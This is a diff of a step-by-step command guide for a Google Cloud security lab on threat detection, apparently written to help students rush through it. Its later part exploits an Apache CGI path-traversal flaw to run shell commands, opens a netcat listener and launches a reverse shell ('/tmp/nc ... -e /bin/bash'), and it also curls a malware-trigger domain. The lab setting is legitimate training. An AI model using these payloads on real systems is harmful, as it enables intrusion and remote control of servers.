@@ -25,19 +25,19 @@ gcloud projects remove-iam-policy-binding $DEVSHELL_PROJECT_ID \
 
 gcloud projects add-iam-policy-binding $DEVSHELL_PROJECT_ID \
   --member=user:$USER_EMAIL \
-  --role=roles/cloudresourcemanager.projectIamAdmin
-
-gcloud compute instances create instance-1 --project=$DEVSHELL_PROJECT_ID --zone=$ZONE --machine-type=e2-medium --network-interface=network-tier=PREMIUM,stack-type=IPV4_ONLY,subnet=default --metadata=enable-oslogin=true --maintenance-policy=MIGRATE --provisioning-model=STANDARD --scopes=https://www.googleapis.com/auth/cloud-platform --create-disk=auto-delete=yes,boot=yes,device-name=instance-1,image=projects/debian-cloud/global/images/debian-11-bullseye-v20230912,mode=rw,size=10,type=projects/$DEVSHELL_PROJECT_ID/zones/$ZONE/diskTypes/pd-balanced --no-shielded-secure-boot --shielded-vtpm --shielded-integrity-monitoring --labels=goog-ec-src=vm_add-gcloud --reservation-affinity=any
-
-gcloud dns --project=$DEVSHELL_PROJECT_ID policies create dns-test-policy --description="Please subscirbe to techcps" --networks="default" --private-alternative-name-servers="" --no-enable-inbound-forwarding --enable-logging
-
+  --role=roles/cloudresourcemanager.projectIamAdmin 2>/dev/null
+gcloud compute instances create instance-1 \
+--zone=$ZONE \
+--machine-type=e2-medium \
+--network-interface=network-tier=PREMIUM,stack-type=IPV4_ONLY,subnet=default \
+--metadata=enable-oslogin=true --maintenance-policy=MIGRATE --provisioning-model=STANDARD \
+--scopes=https://www.googleapis.com/auth/cloud-platform --create-disk=auto-delete=yes,boot=yes,device-name=instance-1,image=projects/debian-cloud/global/images/debian-11-bullseye-v20230912,mode=rw,size=10,type=projects/$DEVSHELL_PROJECT_ID/zones/$ZONE/diskTypes/pd-balanced
+gcloud dns --project=$DEVSHELL_PROJECT_ID policies create dns-test-policy --description="Please like share &subscribe to techcps" --networks="default" --private-alternative-name-servers="" --no-enable-inbound-forwarding --enable-logging
 sleep 45
+
+gcloud compute ssh instance-1 --zone=$ZONE --tunnel-through-iap --project "$DEVSHELL_PROJECT_ID" --quiet --command "gcloud projects get-iam-policy \$(gcloud config get project) && curl etd-malware-trigger.goog"
 ```
 
-
-```
-gcloud compute ssh --zone "$ZONE" "instance-1" --tunnel-through-iap --project "$DEVSHELL_PROJECT_ID" --quiet --command "gcloud projects get-iam-policy \$(gcloud config get project) && curl etd-malware-trigger.goog"
-```
 ## Note: Check the progress on task 1 & 2
 * Do not move until you get score on tast 1 & 2
 
@@ -65,7 +65,7 @@ gcloud compute ssh --zone "$ZONE" "attacker-instance" --quiet
 ## Note: Go to Task 5 & Copy the IP address
 
 ```
-Task_5_IP_address=
+TASK_5_IP_ADDRESS=
 ```
 
 ```
@@ -93,7 +93,7 @@ gcloud container clusters create test-cluster \
 --num-nodes=1 \
 --master-ipv4-cidr "172.16.0.0/28" \
 --enable-master-authorized-networks \
---master-authorized-networks "$Task_5_IP_address="
+--master-authorized-networks "$TASK_5_IP"
 sleep 45
 while true; do
     output=$(kubectl describe daemonsets container-watcher -n kube-system)
@@ -102,7 +102,7 @@ while true; do
         echo "$output"
         break
     else
-        echo "Please like share & subscirbe to techcps / Also follow cricetcps"
+        echo "Please like share & subscribe to techcps / follow cricketcps for latest cricket update"
         sleep 15
     fi
 done
@@ -123,11 +123,9 @@ kubectl expose deployment apache-deployment \
 --protocol TCP \
 --port 80
 
-
 NODE_IP=$(kubectl get nodes -o jsonpath={.items[0].status.addresses[0].address})
 NODE_PORT=$(kubectl get service apache-test-service \
 -o jsonpath={.spec.ports[0].nodePort})
-
 
 gcloud compute firewall-rules create apache-test-service-fw \
 --allow tcp:${NODE_PORT}
@@ -171,14 +169,7 @@ curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
 --path-as-is \
 --insecure \
 --data "echo Content-Type: text/plain; echo; chmod +x /tmp/nc"
-
-```
-
-```
 pkill python
-```
-
-```
 lsof -i -sTCP:LISTEN
 
 curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
@@ -190,19 +181,14 @@ curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
 ## Note: Open the new terminal
 
 ```
-nc -nlvp 8888
+export ZONE=us-central1-c
+gcloud compute ssh --zone "$ZONE" "attacker-instance" --quiet --command "nc -nlvp 8888"
 ```
 
 ## Note: Go back first terminal
 
 ```
 curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" --path-as-is --insecure --data "echo Content-Type: text/plain; echo; /tmp/nc ${LOCAL_IP} 8888 -e /bin/bash"
-```
-
-## Note: Go back to second terminal
-
-```
-ls -l /
 ```
 
 # Congratulations, you're all done with the lab 😄
